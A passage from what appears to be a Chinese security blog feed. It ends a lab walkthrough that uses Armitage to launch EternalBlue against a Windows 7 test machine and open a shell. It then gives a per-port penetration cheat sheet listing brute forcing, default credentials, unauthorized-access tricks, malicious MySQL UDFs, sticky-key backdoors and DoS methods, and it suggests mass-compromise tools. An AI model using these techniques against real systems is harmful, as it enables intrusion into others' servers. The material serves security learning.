rank-&gt;poor就可以了</p><p>扫描以后，我们右键靶机，发现菜单中多了一项“Attack”，在“smb”里面列出了一些漏洞名称。请注意，这里列出的漏洞仅是一部分目标主机系统（也就是win7）可能存在的漏洞，并不一定存在，更别说利用了。为了确定这些漏洞的可用性，我们需要检查一下。依次选择192.168.1.110（右键）-&gt;Attack-&gt;smb-&gt;checkexploits，他会自动扫描检查上面所显示的每一个漏洞是否存在及可用。</p><p>当他显示“This module doesnot support check”或者“Cannot reliably check exploitability”类似的结果时（如下图），就证明这个漏洞不存在或无法利用。</p><p>我们在左边依次点开exploit-&gt;windows-&gt;smb,这里列出了一长串漏洞，我们不妨挑一个试试。</p><p>双击“ms17_010_eternalblue”，这里基本不用改什么，只需要确认这里是445端口就行了</p><p><img src="/images/armitage5.png"></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>点击launch，发起攻击</p><p>然后发现我们成功发起了攻击，然后点击shell取得win7靶机的shell</p><p><img src="/images/armitage6.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见端口及其利用方式</title>
    <link href="/blog/2020/05/06/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
    <url>/blog/2020/05/06/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p><strong>总结一下常见的TCP端口以及这些端口可以利用的点。</strong></p><p><img src="/images/fj47.jpg"></p><span id="more"></span><h2 id="端口利用"><a href="#端口利用" class="headerlink" title="端口利用"></a>端口利用</h2><table><thead><tr><th>端口</th><th>服务</th><th>入侵方式</th></tr></thead><tbody><tr><td>21</td><td>ftp&#x2F;tftp&#x2F;vsftpd文件传输协议</td><td>爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</td></tr><tr><td>22</td><td>ssh远程连接</td><td>爆破&#x2F;openssh漏洞</td></tr><tr><td>23</td><td>Telnet远程连接</td><td>爆破&#x2F;嗅探&#x2F;弱口令</td></tr><tr><td>25</td><td>SMTP邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS域名解析系统</td><td>域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</td></tr><tr><td>67&#x2F;68</td><td>dhcp服务</td><td>劫持&#x2F;欺骗</td></tr><tr><td>110</td><td>pop3</td><td>爆破&#x2F;嗅探</td></tr><tr><td>139</td><td>Samba服务</td><td>爆破&#x2F;未授权访问&#x2F;远程命令执行</td></tr><tr><td>143</td><td>Imap协议</td><td>爆破</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破&#x2F;搜集目标内网信息</td></tr><tr><td>389</td><td>Ldap目录访问协议</td><td>注入&#x2F;未授权访问&#x2F;弱口令</td></tr><tr><td>445</td><td>smb</td><td>ms17-010&#x2F;端口溢出</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>Linux Rexec服务</td><td>爆破&#x2F;Rlogin登陆</td></tr><tr><td>873</td><td>Rsync服务</td><td>文件上传&#x2F;未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破</td></tr><tr><td>1352</td><td>Lotus domino邮件服务</td><td>爆破&#x2F;信息泄漏</td></tr><tr><td>1433</td><td>mssql</td><td>爆破&#x2F;注入&#x2F;SA弱口令</td></tr><tr><td>1521</td><td>oracle</td><td>爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell</td></tr><tr><td>2049</td><td>Nfs服务</td><td>配置不当</td></tr><tr><td>2181</td><td>zookeeper服务</td><td>未授权访问</td></tr><tr><td>2375</td><td>docker remote api</td><td>未授权访问</td></tr><tr><td>3306</td><td>mysql</td><td>爆破&#x2F;注入</td></tr><tr><td>3389</td><td>Rdp远程桌面链接</td><td>爆破&#x2F;shift后门</td></tr><tr><td>4848</td><td>GlassFish控制台</td><td>爆破&#x2F;认证绕过</td></tr><tr><td>5000</td><td>sybase&#x2F;DB2数据库</td><td>爆破&#x2F;注入&#x2F;提权</td></tr><tr><td>5432</td><td>postgresql</td><td>爆破&#x2F;注入&#x2F;缓冲区溢出</td></tr><tr><td>5632</td><td>pcanywhere服务</td><td>抓密码&#x2F;代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破&#x2F;认证绕过</td></tr><tr><td>6379</td><td>Redis数据库</td><td>未授权访问&#x2F;爆破</td></tr><tr><td>7001&#x2F;7002</td><td>weblogic</td><td>java反序列化&#x2F;控制台弱口令</td></tr><tr><td>80&#x2F;443</td><td>http&#x2F;https</td><td>web应用漏洞&#x2F;心脏滴血</td></tr><tr><td>8069</td><td>zabbix服务</td><td>远程命令执行&#x2F;注入</td></tr><tr><td>8161</td><td>activemq</td><td>弱口令&#x2F;写文件</td></tr><tr><td>8080&#x2F;8089</td><td>Jboss&#x2F;Tomcat&#x2F;Resin</td><td>爆破&#x2F;PUT文件上传&#x2F;反序列化</td></tr><tr><td>8083&#x2F;8086</td><td>influxDB</td><td>未授权访问</td></tr><tr><td>9000</td><td>fastcgi</td><td>远程命令执行</td></tr><tr><td>9090</td><td>Websphere控制台</td><td>爆破&#x2F;java反序列化&#x2F;弱口令</td></tr><tr><td>9200&#x2F;9300</td><td>elasticsearch</td><td>远程代码执行</td></tr><tr><td>11211</td><td>memcached</td><td>未授权访问</td></tr><tr><td>27017&#x2F;27018</td><td>mongodb</td><td>未授权访问&#x2F;爆破</td></tr></tbody></table><h3 id="21端口渗透剖析"><a href="#21端口渗透剖析" class="headerlink" title="21端口渗透剖析"></a>21端口渗透剖析</h3><p>FTP通常用作对远程服务器进行管理，典型应用就是对web系统进行管理。一旦FTP密码泄露就直接威胁web系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透FTP服务器的几种方法。<br>（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。<br>（2) ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱<br>（3）后门vsftpd ：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取root权限。（<a href="https://www.freebuf.com/column/143480.html%EF%BC%89">https://www.freebuf.com/column/143480.html）</a><br>（4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。<br>（5）ftp远程代码溢出。（<a href="https://blog.csdn.net/weixin_42214273/article/details/82892282%EF%BC%89%EF%BC%886%EF%BC%89ftp%E8%B7%B3%E8%BD%AC%E6%94%BB%E5%87%BB%E3%80%82%EF%BC%88https://blog.csdn.net/mgxcool/article/details/48249473%EF%BC%89">https://blog.csdn.net/weixin_42214273/article/details/82892282）（6）ftp跳转攻击。（https://blog.csdn.net/mgxcool/article/details/48249473）</a></p><h3 id="22端口渗透剖析"><a href="#22端口渗透剖析" class="headerlink" title="22端口渗透剖析"></a>22端口渗透剖析</h3><p>SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。<br>（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。<br>（2）防火墙SSH后门。（<a href="https://www.secpulse.com/archives/69093.html%EF%BC%89">https://www.secpulse.com/archives/69093.html）</a><br>（3）28退格 OpenSSL<br>（4）openssh 用户枚举 CVE-2018-15473。（<a href="https://www.anquanke.com/post/id/157607%EF%BC%89">https://www.anquanke.com/post/id/157607）</a></p><h3 id="23端口渗透剖析"><a href="#23端口渗透剖析" class="headerlink" title="23端口渗透剖析"></a>23端口渗透剖析</h3><p>telnet是一种旧的远程管理方式，使用telnet工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。<br>（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。<br>（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。</p><h3 id="25-x2F-465端口渗透剖析"><a href="#25-x2F-465端口渗透剖析" class="headerlink" title="25&#x2F;465端口渗透剖析"></a>25&#x2F;465端口渗透剖析</h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件<br>默认端口：25（smtp）、465（smtps）<br>（1）爆破：弱口令<br>（2）未授权访问</p><h3 id="53端口渗透剖析"><a href="#53端口渗透剖析" class="headerlink" title="53端口渗透剖析"></a>53端口渗透剖析</h3><p>53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。<br>（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（<a href="https://www.seebug.org/vuldb/ssvid-96718%EF%BC%89">https://www.seebug.org/vuldb/ssvid-96718）</a><br>（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（<a href="https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc%EF%BC%89">https://baijiahao.baidu.com/s?id=1577362432987749706&amp;wfr=spider&amp;for=pc）</a><br>（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（<a href="http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml%EF%BC%89%EF%BC%884%EF%BC%89DNS%E5%8A%AB%E6%8C%81%E3%80%82%EF%BC%88https://blog.csdn.net/qq_32447301/article/details/77542474%EF%BC%89">http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）（4）DNS劫持。（https://blog.csdn.net/qq_32447301/article/details/77542474）</a></p><h3 id="80端口渗透剖析"><a href="#80端口渗透剖析" class="headerlink" title="80端口渗透剖析"></a>80端口渗透剖析</h3><p>80端口通常提供web服务。目前黑客对80端口的攻击典型是采用SQL注入的攻击方法，脚本渗透技术也是一项综合性极高的web渗透技术，同时脚本渗透技术对80端口也构成严重的威胁。<br>（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。<br>（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。使用X-SCAN可直接探测到IIS漏洞。<br>（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。<br>（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。<br>（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。<br>（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。<br>（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。</p><h3 id="135端口渗透剖析"><a href="#135端口渗透剖析" class="headerlink" title="135端口渗透剖析"></a>135端口渗透剖析</h3><p>135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’病毒就是利用这个漏洞进行传播的。对于135端口的渗透，黑客的渗透方法为:<br>（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。（<a href="https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html%EF%BC%89">https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）</a><br>（2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用hydra。对于telnet服务的开启可使用工具kali链接。（<a href="https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html%EF%BC%89">https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）</a></p><h3 id="139-x2F-445端口渗透剖析"><a href="#139-x2F-445端口渗透剖析" class="headerlink" title="139&#x2F;445端口渗透剖析"></a>139&#x2F;445端口渗透剖析</h3><p>139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139&#x2F;445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。<br>（1）对于开放139&#x2F;445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（<a href="https://blog.csdn.net/qq_41880069/article/details/82908131%EF%BC%89">https://blog.csdn.net/qq_41880069/article/details/82908131）</a><br>（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（<a href="https://blog.csdn.net/god_7z1/article/details/6773652%EF%BC%89">https://blog.csdn.net/god_7z1/article/details/6773652）</a><br>（3）对于开放139&#x2F;445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（<a href="https://blog.warhut.cn/dmbj/145.html%EF%BC%89">https://blog.warhut.cn/dmbj/145.html）</a><br>（4）对于开放139&#x2F;445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。</p><h3 id="1433端口渗透剖析"><a href="#1433端口渗透剖析" class="headerlink" title="1433端口渗透剖析"></a>1433端口渗透剖析</h3><p>1433是SQLServer默认的端口，SQL Server服务使用两个端口：tcp-1433、UDP-1434.其中1433用于供SQLServer对外提供服务，1434用于向请求者返回SQLServer使用了哪些TCP&#x2F;IP端口。1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。<br>（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（<a href="https://blog.csdn.net/gxj022/article/details/4593015%EF%BC%89">https://blog.csdn.net/gxj022/article/details/4593015）</a><br>（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。（<a href="https://blog.csdn.net/kali_linux/article/details/50499576%EF%BC%89">https://blog.csdn.net/kali_linux/article/details/50499576）</a><br>（3）嗅探技术同样能嗅探到SQL Server的登录密码。<br>（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。</p><h3 id="1521端口渗透剖析"><a href="#1521端口渗透剖析" class="headerlink" title="1521端口渗透剖析"></a>1521端口渗透剖析</h3><p>1521是大型数据库Oracle的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是Access，MSSQL以及MYSQL这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：<br>（1）Oracle拥有非常多的默认用户名和密码，为了获得数据库系统的访问权限，破解数据库系统用户以及密码是黑客必须攻破的一道安全防线。<br>（2）SQL注射同样对Oracle十分有效，通过注射可获得数据库的敏感信息，包括管理员密码等。</p><p>（3）在注入点直接创建java，执行系统命令。（4）<a href="https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html">https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</a></p><p>以上的端口渗透原理只是用作分析，现在网上有很多自动的端口入侵工具，比如445批量抓鸡器或者1433批量抓鸡器。大家有兴趣的可以去网上下载试用。</p><h3 id="2049端口渗透剖析"><a href="#2049端口渗透剖析" class="headerlink" title="2049端口渗透剖析"></a>2049端口渗透剖析</h3><p>NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP&#x2F;IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。<br>未授权访问。（<a href="https://www.freebuf.com/articles/network/159468.html%EF%BC%89">https://www.freebuf.com/articles/network/159468.html）</a>           (<a href="http://www.secist.com/archives/6192.htm">http://www.secist.com/archives/6192.htm</a>)</p><h3 id="3306端口渗透剖析"><a href="#3306端口渗透剖析" class="headerlink" title="3306端口渗透剖析"></a>3306端口渗透剖析</h3><p>3306是MYSQL数据库默认的监听端口，通常部署在中型web系统中。在国内LAMP的配置是非常流行的，对于php+mysql构架的攻击也是属于比较热门的话题。mysql数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于3306端口的渗透，黑客的方法如下:<br>（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。<br>（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。<br>（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。</p><h3 id="3389端口渗透剖析"><a href="#3389端口渗透剖析" class="headerlink" title="3389端口渗透剖析"></a>3389端口渗透剖析</h3><p>3389是windows远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单。当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法漏洞’进行渗透。<br>（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。<br>（2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。<br>（3）Shift粘滞键后门：5次shift后门<br>（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。（5）爆破3389端口。这里还是推荐使用hydra爆破工具。（6）ms12_020死亡蓝屏攻击。（<a href="https://www.cnblogs.com/R-Hacker/p/9178066.html%EF%BC%89%EF%BC%887%EF%BC%89https://www.cnblogs.com/backlion/p/9429738.html">https://www.cnblogs.com/R-Hacker/p/9178066.html）（7）https://www.cnblogs.com/backlion/p/9429738.html</a></p><h3 id="4899端口渗透剖析"><a href="#4899端口渗透剖析" class="headerlink" title="4899端口渗透剖析"></a>4899端口渗透剖析</h3><p>4899端口是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。radmini目前支持TCP&#x2F;IP协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：<br>（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。<br>（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。</p><h3 id="5432端口渗透剖析"><a href="#5432端口渗透剖析" class="headerlink" title="5432端口渗透剖析"></a>5432端口渗透剖析</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。<br>（1）爆破：弱口令：postgres postgres<br>（2）缓冲区溢出：CVE-2014-2669。（<a href="http://drops.xmd5.com/static/drops/tips-6449.html%EF%BC%89%EF%BC%883%EF%BC%89%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%9ACVE-2018-1058%E3%80%82%EF%BC%88https://www.secpulse.com/archives/69153.html%EF%BC%89">http://drops.xmd5.com/static/drops/tips-6449.html）（3）远程代码执行：CVE-2018-1058。（https://www.secpulse.com/archives/69153.html）</a></p><h3 id="5631端口渗透剖析"><a href="#5631端口渗透剖析" class="headerlink" title="5631端口渗透剖析"></a>5631端口渗透剖析</h3><p>5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意下载保存连接密码的*.cif文件，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个webshell。通常这些操作在黑客界被称为pcanywhere提权技术。<br>PcAnyWhere提权。（<a href="https://blog.csdn.net/Fly_hps/article/details/80377199%EF%BC%89">https://blog.csdn.net/Fly_hps/article/details/80377199）</a></p><h3 id="5900端口渗透剖析"><a href="#5900端口渗透剖析" class="headerlink" title="5900端口渗透剖析"></a>5900端口渗透剖析</h3><p>5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&amp;T的欧洲研究实验室开发的。VNC是在基于unix和linux操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和windows和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下：<br>（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。<br>（2）cain同样支持对VNC的嗅探，同时支持端口修改。<br>（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。（4）VNC拒绝服务攻击（CVE-2015-5239）。（<a href="http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html%EF%BC%89%EF%BC%885%EF%BC%89VNC%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88CVE-2013-6886%EF%BC%89%E3%80%82">http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）（5）VNC权限提升（CVE-2013-6886）。</a></p><h3 id="6379端口渗透剖析"><a href="#6379端口渗透剖析" class="headerlink" title="6379端口渗透剖析"></a>6379端口渗透剖析</h3><p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。<br>（1）爆破：弱口令<br>（2）未授权访问+配合ssh key提权。（<a href="http://www.alloyteam.com/2017/07/12910/%EF%BC%89">http://www.alloyteam.com/2017/07/12910/）</a></p><h3 id="7001-x2F-7002端口渗透剖析"><a href="#7001-x2F-7002端口渗透剖析" class="headerlink" title="7001&#x2F;7002端口渗透剖析"></a>7001&#x2F;7002端口渗透剖析</h3><p>7001&#x2F;7002通常是weblogic中间件端口<br>（1）弱口令、爆破，弱密码一般为weblogic&#x2F;Oracle@123 or weblogic<br>（2）管理后台部署 war 后门<br>（3）SSRF<br>（4）反序列化漏洞<br>（5）weblogic_uac<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrfhttps://bbs.pediy.com/thread-224954.htmhttps://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrfhttps://bbs.pediy.com/thread-224954.htmhttps://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</a></p><h3 id="8080端口渗透剖析"><a href="#8080端口渗透剖析" class="headerlink" title="8080端口渗透剖析"></a>8080端口渗透剖析</h3><p>8080端口通常是apache_Tomcat服务器默认监听端口，apache是世界使用排名第一的web服务器。国内很多大型系统都是使用apache服务器，对于这种大型服务器的渗透，主要有以下方法：<br>（1）Tomcat远程代码执行漏洞（<a href="https://www.freebuf.com/column/159200.html%EF%BC%89">https://www.freebuf.com/column/159200.html）</a><br>（2）Tomcat任意文件上传。（<a href="http://liehu.tass.com.cn/archives/836%EF%BC%89">http://liehu.tass.com.cn/archives/836）</a><br>（3）Tomcat远程代码执行&amp;信息泄露。（<a href="https://paper.seebug.org/399/%EF%BC%89">https://paper.seebug.org/399/）</a><br>（4）Jboss远程代码执行。（<a href="http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html%EF%BC%89">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html）</a><br>（5）Jboss反序列化漏洞。（<a href="https://www.zybuluo.com/websec007/note/838374%EF%BC%89">https://www.zybuluo.com/websec007/note/838374）</a><br>（6）Jboss漏洞利用。（<a href="https://blog.csdn.net/u011215939/article/details/79141624%EF%BC%89">https://blog.csdn.net/u011215939/article/details/79141624）</a></p><h3 id="27017端口渗透剖析"><a href="#27017端口渗透剖析" class="headerlink" title="27017端口渗透剖析"></a>27017端口渗透剖析</h3><p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似</p><p>（1）爆破：弱口令<br>（2）未授权访问；（<a href="http://www.cnblogs.com/LittleHann/p/6252421.html%EF%BC%89%EF%BC%883%EF%BC%89http://www.tiejiang.org/19157.htm">http://www.cnblogs.com/LittleHann/p/6252421.html）（3）http://www.tiejiang.org/19157.htm</a></p><h2 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h2><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>tcpmux</td><td>TCP 端口服务多路复用</td></tr><tr><td>5</td><td>rje</td><td>远程作业入口</td></tr><tr><td>7</td><td>echo</td><td>Echo 服务</td></tr><tr><td>9</td><td>discard</td><td>用于连接测试的空服务</td></tr><tr><td>11</td><td>systat</td><td>用于列举连接了的端口的系统状态</td></tr><tr><td>13</td><td>daytime</td><td>给请求主机发送日期和时间</td></tr><tr><td>17</td><td>qotd</td><td>给连接了的主机发送每日格言</td></tr><tr><td>18</td><td>msp</td><td>消息发送协议</td></tr><tr><td>19</td><td>chargen</td><td>字符生成服务；发送无止境的字符流</td></tr><tr><td>20</td><td>ftp-data</td><td>FTP 数据端口</td></tr><tr><td>21</td><td>ftp</td><td>文件传输协议（FTP）端口；有时被文件服务协议（FSP）使用</td></tr><tr><td>22</td><td>ssh</td><td>安全 Shell（SSH）服务</td></tr><tr><td>23</td><td>telnet</td><td>Telnet 服务</td></tr><tr><td>25</td><td>smtp</td><td>简单邮件传输协议（SMTP）</td></tr><tr><td>37</td><td>time</td><td>时间协议</td></tr><tr><td>39</td><td>rlp</td><td>资源定位协议</td></tr><tr><td>42</td><td>nameserver</td><td>互联网名称服务</td></tr><tr><td>43</td><td>nicname</td><td>WHOIS 目录服务</td></tr><tr><td>49</td><td>tacacs</td><td>用于基于 TCP&#x2F;IP 验证和访问的终端访问控制器访问控制系统</td></tr><tr><td>50</td><td>re-mail-ck</td><td>远程邮件检查协议</td></tr><tr><td>53</td><td>domain</td><td>域名服务（如 BIND）</td></tr><tr><td>63</td><td>whois++</td><td>WHOIS++，被扩展了的 WHOIS 服务</td></tr><tr><td>67</td><td>bootps</td><td>引导协议（BOOTP）服务；还被动态主机配置协议（DHCP）服务使用</td></tr><tr><td>68</td><td>bootpc</td><td>Bootstrap（BOOTP）客户；还被动态主机配置协议（DHCP）客户使用</td></tr><tr><td>69</td><td>tftp</td><td>小文件传输协议（TFTP）</td></tr><tr><td>70</td><td>gopher</td><td>Gopher 互联网文档搜寻和检索</td></tr><tr><td>71</td><td>netrjs-1</td><td>远程作业服务</td></tr><tr><td>72</td><td>netrjs-2</td><td>远程作业服务</td></tr><tr><td>73</td><td>netrjs-3</td><td>远程作业服务</td></tr><tr><td>73</td><td>netrjs-4</td><td>远程作业服务</td></tr><tr><td>79</td><td>finger</td><td>用于用户联系信息的 Finger 服务</td></tr><tr><td>80</td><td>http</td><td>用于万维网（WWW）服务的超文本传输协议（HTTP）</td></tr><tr><td>88</td><td>kerberos</td><td>Kerberos 网络验证系统</td></tr><tr><td>95</td><td>supdup</td><td>Telnet 协议扩展</td></tr><tr><td>101</td><td>hostname</td><td>SRI-NIC 机器上的主机名服务</td></tr><tr><td>102</td><td>iso-tsap</td><td>ISO 开发环境（ISODE）网络应用</td></tr><tr><td>105</td><td>csnet-ns</td><td>邮箱名称服务器；也被 CSO 名称服务器使用</td></tr><tr><td>107</td><td>rtelnet</td><td>远程 